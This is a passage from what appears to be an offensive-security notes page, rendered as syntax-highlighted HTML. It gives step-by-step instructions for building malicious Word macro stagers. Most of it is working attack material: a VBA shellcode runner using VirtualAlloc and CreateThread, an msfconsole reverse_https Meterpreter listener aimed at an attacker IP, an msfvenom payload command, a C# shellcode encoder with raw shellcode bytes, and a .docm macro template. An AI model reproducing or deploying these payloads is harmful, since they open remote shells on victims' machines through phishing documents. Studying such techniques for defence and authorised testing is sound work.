style="color:#36acaa">19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">158</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">180</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Dim scSize As </span><span class="token class-name">Long</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    scSize </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Decrypt shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">Dim</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">keyArrayTemp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As </span><span class="token class-name">Byte</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    keyArrayTemp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Key</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">For</span><span class="token plain"> x </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token return-type class-name">To</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token return-type class-name">Xor</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">keyArrayTemp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Mod </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Next x</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; TODO </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> the </span><span class="token return-type class-name">SIZE</span><span class="token plain"> here </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">use a size </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> to the </span><span class="token class-name">shellcode</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">Dim</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">685</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Byte</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">For</span><span class="token plain"> y </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token return-type class-name">To</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Next y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27; </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H3000 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x3000</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> MEM_COMMIT </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> MEM_RESERVE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27; </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H40 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">PAGE_EXECUTE_READWRITE</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H3000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H40</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token class-name">For</span><span class="token plain"> counter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">LBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token return-type class-name">To</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">counter</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">RtlMoveMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> counter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Next </span><span class="token class-name">counter</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Start your Metasploit listener</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> msfconsole </span><span class="token parameter variable" style="color:#36acaa">-q</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-x</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Deliver your Word Stager and wait for access</strong></li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="shellcode-runner---c-vba-encrypted"><strong>Shellcode Runner - C# VBA Encrypted</strong><a href="#shellcode-runner---c-vba-encrypted" class="hash-link" aria-label="Direct link to shellcode-runner---c-vba-encrypted" title="Direct link to shellcode-runner---c-vba-encrypted" translate="no">​</a></h3>
<p><strong>Steps</strong></p>
<ol>
<li class=""><strong>Create your Shellcode</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/meterpreter/reverse_https </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LHOST</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LPORT</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">EXITFUNC</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">thread </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> csharp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Encrypt the shellcode</strong>, they are many ways to do it but I will use this personal C# VBA Encrypter</li>
</ol>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">using System</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Collections</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Generic</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Linq</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Text</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Threading</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Tasks</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">namespace vba_encrypter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Program</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        static void Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">string</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> args</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> buf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> new byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">681</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">0xfc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xe8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x8f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x60</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x89</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xe5</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x31</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xd2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x64</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x8b</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x52</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x8b</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x52</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x0c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x53</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xd5</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> encoded </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> new byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">+</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                encoded</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">byte</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">uint</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xFF</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            uint counter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            StringBuilder </span><span class="token builtin">hex</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> new StringBuilder</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">encoded</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            foreach </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">byte b </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> encoded</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">AppendFormat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;{0:D}, &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                counter</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">+</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">counter </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">AppendFormat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;_{0}&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Environment</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">NewLine</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">WriteLine</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;The payload is: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ToString</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Create the Macros file</strong>, use code below inserting your encrypted shellcode and save the file as a <code>.docm</code></li>
</ol>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function CreateThread Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal SecurityAttributes </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal StackSize </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal StartFunction </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ThreadParameter </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal CreateFlags </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef ThreadId </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function VirtualAlloc Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lpAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwSize </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal flAllocationType </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal flProtect </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function RtlMoveMemory Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lDestination </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef sSource </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lLength </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">MyMacro</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim buf As Variant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim addr As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim counter As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim data As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim res As </span><span class="token class-name">LongPtr</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    buf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Array</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">254</span><span class="token punctuation" 